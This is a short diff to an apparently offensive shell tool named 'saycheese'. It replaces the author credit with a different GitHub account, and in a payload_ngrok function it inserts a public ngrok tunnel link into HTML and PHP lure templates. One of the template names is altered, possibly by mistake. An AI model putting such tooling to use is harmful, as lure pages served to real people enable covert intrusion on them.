@@ -15,7 +15,7 @@ printf "\e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __
 printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
 printf "\e[1;92m              |___/ \e[0m                                 \n"
 
-printf " \e[1;77m v1.0 coded by github.com/Aonymous3-SIT/saycheese\e[0m \n"
+printf " \e[1;77m v1.0 coded by github.com/mdjunaidahmed0123\e[0m \n"
 
 printf "\n"
 
@@ -122,7 +122,7 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' saycheese.html > index2.html
+sed 's+forwarding_link+'$link'+g' saycheer.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
